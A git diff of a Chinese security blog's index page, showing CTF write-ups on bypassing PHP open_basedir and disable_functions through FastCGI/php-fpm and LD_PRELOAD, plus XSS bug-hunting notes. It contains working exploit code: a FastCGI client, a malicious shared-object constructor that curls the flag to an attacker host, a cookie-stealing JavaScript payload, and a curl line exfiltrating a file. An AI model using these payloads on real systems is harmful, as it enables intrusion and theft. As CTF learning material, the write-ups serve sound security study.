+        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,
+        &#39;response&#39; =&gt; null
+    );
+    return $id;
+}
+public function wait_for_response( $requestId, $timeoutMs = 0 ) {
+    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {
+        throw new \Exception( &#39;Invalid request id given&#39; );
+    }
+    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK
+         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR
+    ) {
+        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
+    }
+    if ( $timeoutMs &gt; 0 ) {
+              // Reset timeout on socket for now
+              $this-&gt;set_ms_timeout( $timeoutMs );
+          } else {
+              $timeoutMs = $this-&gt;_readWriteTimeout;
+    }
+    $startTime = microtime( true );
+          do {
+              $resp = $this-&gt;readPacket();
+              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {
+                  if ( $resp[&#39;type&#39;] == self::STDERR ) {
+                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;
+                  }
+                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];
+              }
+              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {
+                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;
+                  if ( $resp[&#39;requestId&#39;] == $requestId ) {
+                      break;
+                  }
+              }
+              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {
+                  // Reset
+                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+                  throw new \Exception( &#39;Timed out&#39; );
+              }
+          } while ( $resp );
+    if ( ! is_array( $resp ) ) {
+              $info = stream_get_meta_data( $this-&gt;_sock );
+              // We must reset timeout but it must be AFTER we get info
+              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+              if ( $info[&#39;timed_out&#39;] ) {
+                  throw new TimedOutException( &#39;Read timed out&#39; );
+              }
+              if ( $info[&#39;unread_bytes&#39;] == 0
+                   &amp;&amp; $info[&#39;blocked&#39;]
+                   &amp;&amp; $info[&#39;eof&#39;] ) {
+                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );
+              }
+              throw new \Exception( &#39;Read failed&#39; );
+          }
+          // Reset timeout
+          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {
+        case self::CANT_MPX_CONN:
+            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );
+            break;
+        case self::OVERLOADED:
+            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );
+            break;
+        case self::UNKNOWN_ROLE:
+            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );
+            break;
+        case self::REQUEST_COMPLETE:
+            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
+    }
+}
+}
+$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);
+  $php_value = &quot;open_basedir = /&quot;;
+$filepath  = &#39;/tmp/readflag.php&#39;;
+  $content   = &#39;hpdoger&#39;;
+echo $client-&gt;request(
+      array(
+          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
+          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
+          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
+    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,
+    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
+    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
+    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,
+    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
+    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,
+    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),
+          &#39;PHP_VALUE&#39;         =&gt; $php_value,
+),
+$content
+);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
+<p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p>
+<pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）
+
+*lo2.txt*=&gt;
+&lt;?php
+$file_list = array();
+// normal files
+$it = new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+// special files (starting with a dot(.))
+$it = new DirectoryIterator(&quot;glob:///.*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+sort($file_list);
+foreach($file_list as $f){
+        echo &quot;{$f}&lt;br/&gt;&quot;;
+}
+?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p>
+<p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p>
+<p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p>
+<p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p>
+<pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p>
+<pre><code>&lt;?php
+var_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p>
+<h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p>
+<p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p>
+<p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p>
+<p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p>
+<pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+__attribute__ ((__constructor__)) void preload (void)
+{
+    system(&quot;curl vps:6666/`/readflag`&quot;);
+}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p>
+<pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p>
+<p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p>
+<pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p>
+<h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);
+error_log(&#39;&#39;,1);
+?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/"> 
                     帝国(EmpireCMS)7.5的两个后台RCE审计 
                 </a>
@@ -200,7 +768,7 @@ if($enews==&quot;AddIndexpage&quot;)
             </div>
             <div class="continue">
             <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -371,7 +939,7 @@ namespace{
             </div>
             <div class="continue">
             <a href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -475,7 +1043,7 @@ cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数
             </div>
             <div class="continue">
             <a href="/2019/08/13/从一次漏洞挖掘入门ldap注入/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -636,7 +1204,7 @@ cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数
             </div>
             <div class="continue">
             <a href="/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -748,7 +1316,7 @@ launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvi
             </div>
             <div class="continue">
             <a href="/2019/08/06/De1CTF-Giftbox题解/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -825,7 +1393,7 @@ eval($_REQUEST[a]);
             </div>
             <div class="continue">
             <a href="/2019/07/29/CISCN 2019 Final Web11复盘/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -880,7 +1448,7 @@ window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id
             </div>
             <div class="continue">
             <a href="/2019/07/02/前端全局变量劫持/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -959,211 +1527,7 @@ $result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</co
             </div>
             <div class="continue">
             <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/04/08/西湖论剑2019-Writeup/"> 
-                    西湖论剑2019-Writeup 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-04-08   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p>
-<p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p>
-<h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p>
-<p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p>
-<p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p>
-<p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p>
-<p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p>
-<p>点开hint有两个提示，</p>
-<ol>
-<li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li>
-<li>seed应该暗示着随机数/种子</li>
-</ol>
-<p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p>
-<p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p>
-<p>略脑洞。。</p>
-<h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p>
-<p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p>
-<pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p>
-<p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p>
-<p>但是测试用js uri加载外源js不能成功，打不到cookie。</p>
-<p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p>
-<p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p>
-<p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p>
-<p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p>
-<p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p>
-<pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p>
-<p>编码转换的exp如下</p>
-<pre><code># Author:Hpdoger@d0g3
-
-html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;
-
-buffer = &quot;&quot;
-
-for zimu in html_old:
-    zimu = ord(zimu)
-    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)
-    # print(&quot;&amp;#&quot;+zimu)
-    buffer = buffer + zimu
-print(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p>
-<p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p>
-<p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p>
-<p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p>
-<h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p>
-<p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p>
-<p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p>
-<p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p>
-<pre><code>#! /usr/bin/python3
-# Author: Hpdoger@d0g3
-
-count = 0
-change_list = []
-word_list = &#39;&#39;
-zimus = &#39;&#39;
-
-with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:
-    for ttl in file.readlines():
-        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))
-        if len(change_list) == 4:
-            for num in change_list:
-                num = int(num)
-                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)
-                b = str(&quot;%08d&quot; % int(a))
-                infront = b[0:2]
-                word_list = word_list + infront
-
-
-            zimu = int(word_list,2)
-            zimus = zimus+chr(zimu)
-            word_list = &#39;&#39;
-            change_list.clear()
-            count = 0
-
-with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:
-    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p>
-<p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p>
-<p>拼接扫描得到:</p>
-<pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/04/08/西湖论剑2019-Writeup/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/"> 
-                    SRC挖掘初探之随缘XSS挖掘 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-04-05   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/论坛文章/">论坛文章</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p>
-<p>Author:Hpdoger@D0g3</p>
-<p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p>
-<p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p>
-<h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p>
-<p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p>
-<p>其中,getparam方法如下</p>
-<pre><code>getParam: function(c_name) {
-    var urlParams = location.href;
-    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€
-    if (c_start != -1) {
-        c_start = c_start + c_name.length + 1;銆€
-        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);
-        if (c_end == -1) {
-            c_end = urlParams.length;
-        }
-        return urlParams.substring(c_start, c_end);
-    }else{
-        return null;
-    }
-},</code></pre><p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p>
-<p>POC：</p>
-<pre><code>cb=javascript:alert(document.cookie);//normal.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p>
-<h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p>
-<p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p>
-<p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p>
-<p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p>
-<pre><code>POST xxxx?q=index/feedback HTTP/1.1
-
-imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</code></pre><p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p>
-<p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p>
-<pre><code>imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p>
-<p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p>
-<h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p>
-<p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p>
-<p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p>
-<p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p>
-<ol>
-<li>email字符串长度&lt;40且@结尾</li>
-<li>不能同时出现两个双引号、括号</li>
-<li>正则alert(1)\prompt(1)\confim…</li>
-</ol>
